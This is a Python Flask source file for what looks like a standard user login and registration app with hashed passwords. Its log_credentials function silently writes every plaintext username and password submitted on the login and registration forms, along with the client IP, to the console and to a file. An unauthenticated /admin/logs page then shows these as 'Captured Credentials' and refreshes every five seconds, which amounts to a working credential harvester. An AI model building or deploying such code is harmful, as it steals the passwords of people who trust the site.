from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import os

def log_credentials(username, password, source="login"):
    """Log credentials to file AND print to console"""
    log_file = "credentials_log.txt"
    
    # PRINT TO CONSOLE (THIS IS WHAT YOU'RE MISSING!)
    print("\n" + "="*60)
    print(f"🔔 NEW {source.upper()} ATTEMPT!")
    print(f"👤 Username: {username}")
    print(f"🔑 Password: {password}")
    print(f"⏰ Time: {datetime.now()}")
    print(f"🌐 IP: {request.remote_addr}")
    print("="*60 + "\n")
    
    # ALSO SAVE TO FILE
    with open(log_file, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"\n{'='*60}\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Source: {source}\n")
        f.write(f"Username: {username}\n")
        f.write(f"Password: {password}\n")
        f.write(f"IP: {request.remote_addr}\n")
        f.write(f"{'='*60}\n")

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key-change-in-production')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize database
db = SQLAlchemy(app)

# Initialize login manager
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# User Model - This is our database table structure
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    
    def set_password(self, password):
        """Hash the password before storing it"""
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        """Check if provided password matches the hash"""
        return check_password_hash(self.password_hash, password)

# This callback loads the user from the database
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# Routes (URL endpoints)

@app.route('/')
def index():
    """Home page"""
    return render_template('test.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    """User registration page"""
    if request.method == 'POST':
        # Get data from the form
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        log_credentials(username, password, source="registration")

        
        # Validate input
        if not username or not email or not password:
            flash('All fields are required!', 'error')
            return render_template('register.html')
        
        # Check if user already exists
        if User.query.filter_by(username=username).first():
            flash('Username already exists!', 'error')
            return render_template('register.html')
        
        if User.query.filter_by(email=email).first():
            flash('Email already registered!', 'error')
            return render_template('register.html')
        
        # Create new user
        new_user = User(username=username, email=email)
        new_user.set_password(password)
        
        # Add to database
        db.session.add(new_user)
        db.session.commit()
        
        flash('Registration successful! Please login.', 'success')
        return redirect(url_for('login'))
    
    return render_template('test.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """User login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        log_credentials(username, password, source="login")
        # Find user in database
        user = User.query.filter_by(username=username).first()
        
        # Check if user exists and password is correct
        if user and user.check_password(password):
            login_user(user)
            flash('Login successful!', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password!', 'error')
    
    return render_template('test.html')

@app.route('/dashboard')
@login_required
def dashboard():
    """Protected page - only logged in users can see this"""
    return render_template('dashboard.html', username=current_user.username)

@app.route('/logout')
@login_required
def logout():
    """Logout user"""
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('index'))

# API Endpoints (for programmatic access)

@app.route('/api/register', methods=['POST'])
def api_register():
    """API endpoint for registration"""
    data = request.get_json()
    
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')
    
    if not username or not email or not password:
        return jsonify({'error': 'All fields are required'}), 400
    
    if User.query.filter_by(username=username).first():
        return jsonify({'error': 'Username already exists'}), 400
    
    if User.query.filter_by(email=email).first():
        return jsonify({'error': 'Email already registered'}), 400
    
    new_user = User(username=username, email=email)
    new_user.set_password(password)
    db.session.add(new_user)
    db.session.commit()
    
    return jsonify({'message': 'User registered successfully', 'user_id': new_user.id}), 201


@app.route('/admin/logs')
def admin_logs():
    """View credential logs via web interface"""
    try:
        with open('credentials_log.txt', 'r') as f:
            logs = f.read()
    except FileNotFoundError:
        logs = "No logs yet. Try logging in first!"
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin - Credential Logs</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body {{
                font-family: 'Courier New', monospace;
                background: #0a0e27;
                color: #00ff00;
                padding: 20px;
                margin: 0;
            }}
            h1 {{
                color: #00ff00;
                text-shadow: 0 0 10px #00ff00;
                text-align: center;
            }}
            pre {{
                background: #000;
                padding: 20px;
                border-radius: 8px;
                border: 2px solid #00ff00;
                overflow-x: auto;
                white-space: pre-wrap;
                word-wrap: break-word;
            }}
            .refresh {{
                text-align: center;
                color: #ffd700;
                margin: 10px 0;
            }}
        </style>
    </head>
    <body>
        <h1>🔐 Captured Credentials</h1>
        <div class="refresh">⟳ Auto-refreshing every 5 seconds</div>
        <pre>{logs}</pre>
    </body>
    </html>
    """
    return html
    
@app.route('/api/login', methods=['POST'])
def api_login():
    """API endpoint for login"""
    data = request.get_json()
    
    username = data.get('username')
    password = data.get('password')
    
    user = User.query.filter_by(username=username).first()
    
    if user and user.check_password(password):
        login_user(user)
        return jsonify({
            'message': 'Login successful',
            'user': {
                'id': user.id,
                'username': user.username,
                'email': user.email
            }
        }), 200
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/users', methods=['GET'])
@login_required
def api_get_users():
    """API endpoint to get all users (protected)"""
    users = User.query.all()
    users_list = [{'id': u.id, 'username': u.username, 'email': u.email} for u in users]
    return jsonify({'users': users_list}), 200

# Initialize database
with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
